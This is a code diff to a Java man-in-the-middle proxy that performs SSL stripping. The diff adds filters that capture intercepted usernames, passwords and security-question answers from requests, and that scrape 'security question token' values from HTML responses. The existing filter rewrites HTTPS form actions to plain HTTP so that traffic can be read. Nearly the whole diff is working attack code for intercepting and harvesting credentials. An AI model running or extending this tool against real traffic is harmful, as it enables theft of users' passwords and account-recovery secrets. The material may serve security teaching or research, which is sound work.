@@ -82,6 +82,52 @@ abstract class Filter {
 	abstract Object transform(Object data);
 }
 
+class ExtractUserInfoFilter extends Filter {
+	Object transform(Object data) {
+		HTTPRequest request = (HTTPRequest) data;
+		if(request.getStructuredParams() != null && request.getStructuredParams().getParameter("username") != null) {
+			System.out.println(request.getStructuredParams().getParameter("username"));
+			System.out.println(request.getStructuredParams().getParameter("password"));
+		}
+		if (request.getBodyParams() != null && request.getBodyParams().getParameter("answer") != null) {
+			System.out.print(request.getBodyParams().getParameter("answer"));
+		}
+		return request;
+	}
+}
+
+class ExtractSecurityToken extends Filter {
+	private static final String HTML_CONTENT_TYPE = "text/html";
+	private static final int SECURITY_TOKEN_POS = 4;
+	Object transform(Object data) {
+		HTTPResponse response = (HTTPResponse) data;
+
+		try {
+			String contentType = response.getContentType();
+			if (contentType != null && contentType.indexOf(HTML_CONTENT_TYPE) != -1) {
+				String body = new String(response.getBody());
+				
+				BufferedReader bodyReader = new BufferedReader(new  StringReader(body));
+				
+				String currentLine;
+				while ((currentLine = bodyReader.readLine()) != null) {
+					if (currentLine.toLowerCase().indexOf("security question token:") != -1) {
+						currentLine = currentLine.trim();
+						String[] tokenCommentLine = currentLine.split(" ");
+						System.out.println(tokenCommentLine[4]);
+					}
+				}
+				
+			}
+		}
+		catch (IOException e) {
+
+		}
+		return data;
+	}
+
+}
+
 class HttpResponseManipulationFilter extends Filter {
 
 	Object transform(Object data) {
@@ -158,23 +204,23 @@ class SslStripperFilter extends Filter {
 	private void changeHttpsInForm(HTTPResponse response ) throws IOException {
 		String stringBody = new String(response.getBody());
 		int currentOccurrance = 0;
-		
+
 		int attributesStartIndex = 6;
 		while ((currentOccurrance = stringBody.indexOf(FORM_TAG_START, currentOccurrance)) != -1) {
 			int endCurrentOccurance = stringBody.substring(currentOccurrance).indexOf(">");
 			String formElement = stringBody.substring(currentOccurrance, currentOccurrance + endCurrentOccurance + 1);
 			int formElementSize = formElement.length();
 			formElement = formElement.trim();
-			
+
 			String attributeString = formElement.substring(attributesStartIndex, formElement.lastIndexOf('>'));
 			String [] attributes = attributeString.split(" ");
-			
+
 			String stringBodyBeforeForm = stringBody.substring(0, currentOccurrance);
-			
+
 			String changedUrl = null;
 			for (int i = 0; i < attributes.length; i++) {
 				if (attributes[i].startsWith("action")) {
-					
+
 					String [] actionKV = attributes[i].split("=");
 					int urlIndex = 0;
 					if ((urlIndex = actionKV[1].indexOf("https")) != -1) {
@@ -190,12 +236,12 @@ class SslStripperFilter extends Filter {
 							SocketConnectorFactory.addHost(uriAndLocator[0]);
 						}
 						changedUrl = actionKV[1];
-						
+
 					}
 					break;
 				}
 			}
-			
+
 			if (changedUrl == null) {
 				currentOccurrance++;
 				continue;
@@ -206,7 +252,7 @@ class SslStripperFilter extends Filter {
 				changedUrl = changedUrl.replaceFirst("https", "http");
 				formElement = formElement.substring(0, formIndexBeforeAction) + "action=\"" + changedUrl +"\"" + formElement.substring(formIndexAfterAction);
 			}
-			
+
 			stringBody = stringBodyBeforeForm + formElement + stringBody.substring(currentOccurrance + endCurrentOccurance + 1);
 			currentOccurrance++;
 		}
@@ -420,6 +466,8 @@ class HTTPRequest {
 	private int port = 80;
 	private String requestParams;
 	private String additionalParams;
+	private HTTPRequestParameters structuredParams;
+	private HTTPRequestParameters bodyParams;
 
 
 	public HTTPRequest(String method, String resource, String host) {
@@ -431,7 +479,7 @@ class HTTPRequest {
 
 
 
-	public HTTPRequest(String method, String resource, String host, int port, HTTPRequestParameters requestParams, String additionalParams) {
+	public HTTPRequest(String method, String resource, String host, int port, HTTPRequestParameters requestParams, String additionalParams, HTTPRequestParameters body) {
 		super();
 		this.method = method;
 		this.resource = resource;
@@ -439,6 +487,8 @@ class HTTPRequest {
 		this.port = port;
 		this.requestParams = requestParams.toString();
 		this.additionalParams = additionalParams;
+		this.structuredParams = requestParams;
+		this.bodyParams = body;
 	}
 
 
@@ -450,6 +500,19 @@ class HTTPRequest {
 
 	public void setAdditionalParams(String additionalParams) {
 		this.additionalParams = additionalParams;
+	}
+
+
+
+
+	public HTTPRequestParameters getBodyParams() {
+		return bodyParams;
+	}
+
+
+
+	public void setBodyParams(HTTPRequestParameters bodyParams) {
+		this.bodyParams = bodyParams;
 	}
 
 
@@ -490,6 +553,19 @@ class HTTPRequest {
 	public void setRequestParams(String requestParams) {
 		this.requestParams = requestParams;
 	}
+
+
+
+	public HTTPRequestParameters getStructuredParams() {
+		return structuredParams;
+	}
+
+
+
+	public void setStructuredParams(HTTPRequestParameters structuredParams) {
+		this.structuredParams = structuredParams;
+	}
+
 
 }
 
@@ -659,12 +735,17 @@ class HTTPParser {
 			}
 			String additionalParams = "";
 			String readLine;
+			String bodyParams = "";
+			boolean bodyFollows = false;
 			while(true) {
 				readLine = reader.readLine();
 				if (readLine != null) {
 
 					if(!readLine.startsWith("Connection")) {
 						if (!readLine.toLowerCase().startsWith("accept-encoding")) {
+							if (bodyFollows) {
+								bodyParams += readLine += "\r\n";
+							}
 							additionalParams += readLine + "\r\n";
 						}
 						else {
@@ -676,6 +757,9 @@ class HTTPParser {
 					}
 
 
+					if (readLine.length() == 0) {
+						bodyFollows = true;
+					}
 
 
 				}else {
@@ -683,7 +767,7 @@ class HTTPParser {
 				}
 			}
 
-			return new HTTPRequest(method, resource, host, port,params, additionalParams);
+			return new HTTPRequest(method, resource, host, port,params, additionalParams, new HTTPRequestParameters(bodyParams));
 
 		}
 		catch (IOException e) {
@@ -821,10 +905,12 @@ class SocketConnectorFactory {
 
 class Proxy {
 
+	private Vector beforeFilterChain;
 	private Vector afterFilterChain;
 	private Socket socket;
 	public Proxy(Socket socket) {
 		this.socket = socket;
+		beforeFilterChain = new Vector();
 		afterFilterChain = new Vector();
 
 	}
@@ -839,6 +925,10 @@ class Proxy {
 		rewritten += "Host: " + request.getHost()+ "\r\n";
 		rewritten += request.getAdditionalParams();
 		return rewritten;
+	}
+
+	public void beforeServerResponse(Filter beforeFilter) {
+		beforeFilterChain.add(beforeFilter);
 	}
 
 	public void afterServerResponse(Filter afterFilter) {
@@ -880,6 +970,13 @@ class Proxy {
 
 			}
 
+			Iterator beforeFilterIterator = beforeFilterChain.iterator();
+			while(beforeFilterIterator.hasNext()) {
+				Filter currentFilter = (Filter)beforeFilterIterator.next();
+				request = (HTTPRequest) currentFilter.transform(request);
+			}
+
+			//System.err.println(request.getAdditionalParams());
 			connection = SocketConnectorFactory.createSocketConnection(request.getHost());
 
 			String rewrittenRequest = rewriteRequest(request);
@@ -931,8 +1028,10 @@ class StripperThread implements Runnable {
 
 	public void run() {
 		Proxy proxy = new Proxy(socket);
+		proxy.beforeServerResponse(new ExtractUserInfoFilter());
 		proxy.afterServerResponse(new SslStripperFilter());
 		proxy.afterServerResponse(new HttpResponseManipulationFilter());
+		proxy.afterServerResponse(new ExtractSecurityToken());
 		proxy.proxyConnection();
 	}
 
